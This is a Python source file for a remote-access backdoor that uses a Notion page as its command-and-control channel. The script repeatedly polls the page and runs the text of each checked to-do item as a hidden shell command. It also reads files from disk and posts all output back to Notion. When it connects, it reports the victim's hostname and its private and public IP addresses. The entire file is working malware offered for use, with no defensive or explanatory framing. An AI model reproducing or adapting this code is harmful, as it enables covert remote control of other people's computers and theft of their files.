
import requests
import time
import subprocess
import os
import socket
from datetime import datetime

# ────────────────────── CONFIG ──────────────────────
TOKEN   = "XXXXXXX74389369JDEl1slzXmrV6M6k6AyDhyGdXXXXXXXXXXX"
PAGE_ID = "XXXXXXXXXe7980e09e83f5XXXXXXXXXX"
# ───────────────────────────────────────────────────

HEADERS = {
    "Authorization": f"Bearer {TOKEN}",
    "Notion-Version": "2022-06-28",
    "Content-Type": "application/json"
}
URL = f"https://api.notion.com/v1/blocks/{PAGE_ID}/children"

class AgentState:
    connected_message_sent = False
    status_task_id = None

state = AgentState()

def post_output(task_id, text):
    try:
        for i in range(0, len(text), 1900):
            payload = {
                "children": [{
                    "object": "block",
                    "type": "paragraph",
                    "paragraph": {"rich_text": [{"type": "text", "text": {"content": text[i:i+1900]}}]}
                }]
            }
            requests.patch(f"https://api.notion.com/v1/blocks/{task_id}/children", headers=HEADERS, json=payload, timeout=10)
    except:
        pass

def uncheck(task_id):
    try:
        requests.patch(f"https://api.notion.com/v1/blocks/{task_id}", headers=HEADERS, json={"to_do": {"checked": False}}, timeout=10)
    except:
        pass

def create_status_task():
    payload = {
        "children": [{
            "object": "block",
            "type": "to_do",
            "to_do": {
                "rich_text": [{"type": "text", "text": {"content": "Bot Status"}}],
                "checked": False
            }
        }]
    }
    resp = requests.patch(URL, headers=HEADERS, json=payload)
    if resp.status_code == 200:
        new_block = resp.json()["results"][-1]
        return new_block["id"]
    return None

def get_victim_info():
    hostname = socket.gethostname()
    try:
        private_ip = socket.gethostbyname(hostname)
    except:
        private_ip = "unknown"
    try:
        public_ip = requests.get("https://api.ipify.org", timeout=5).text
    except:
        public_ip = "unknown"
    return hostname, private_ip, public_ip

def run_command(cmd):
    try:
        creationflags = subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0
        if cmd.strip().lower() == "cmd":
            cmd = "cmd /c echo CMD STARTED & ver & echo CMD ENDED"
        elif cmd.strip().lower() == "powershell":
            cmd = "powershell -c \"Write-Host 'PowerShell STARTED'; hostname; Write-Host 'PowerShell ENDED'\""

        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            timeout=90,
            creationflags=creationflags,
            text=True,
            encoding='utf-8',
            errors='replace'
        )
        return result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        return "[!] Command timed out after 90s"
    except Exception as e:
        return f"[!] Error: {e}"

# MAIN LOOP
while True:
    try:
        resp = requests.get(URL, headers=HEADERS, timeout=15)
        if resp.status_code != 200:
            time.sleep(15)
            continue

        blocks = resp.json().get("results", [])

        # SEND CONNECT MESSAGE ONCE
        if not state.connected_message_sent:
            # Look for existing Bot Status
            for b in blocks:
                if b.get("type") == "to_do":
                    text = "".join(t.get("plain_text", "") for t in b["to_do"]["rich_text"])
                    if "Bot Status" in text:
                        state.status_task_id = b["id"]
                        break

            # Create if not found
            if state.status_task_id is None:
                state.status_task_id = create_status_task()

            if state.status_task_id:
                hostname, private_ip, public_ip = get_victim_info()
                connect_msg = f"[CONNECTED] {hostname} from bot - Private: {private_ip} | Public: {public_ip}"
                post_output(state.status_task_id, connect_msg)
                state.connected_message_sent = True

        # PROCESS COMMANDS
        for block in blocks:
            try:
                if block.get("type") != "to_do" or not block["to_do"].get("checked", False):
                    continue

                task_id = block["id"]
                cmd = "".join(t.get("plain_text", "") for t in block["to_do"]["rich_text"]).strip()
                if not cmd:
                    continue

                print(f"[+] Executing: {cmd}")

                if cmd.lower().startswith(("cat ", "type ", "more ")):
                    try:
                        path = cmd.split(" ", 1)[1].strip().strip('"\'')
                        with open(path, "rb") as f:
                            data = f.read(10*1024*1024)
                        output = data.decode('utf-8', errors='replace')
                    except Exception as e:
                        output = f"File error: {e}"
                    result = f"[{datetime.now().strftime('%H:%M:%S')}] {cmd}\n{output}"
                else:
                    result = f"[{datetime.now().strftime('%H:%M:%S')}] {cmd}\n{run_command(cmd)}"

                post_output(task_id, result)
                uncheck(task_id)

            except Exception as e:
                print(f"[-] Task failed (continuing): {e}")
                try:
                    uncheck(block.get("id", ""))
                except:
                    pass

    except Exception as e:
        print(f"[-] Main loop error (agent continues): {e}")

    time.sleep(10)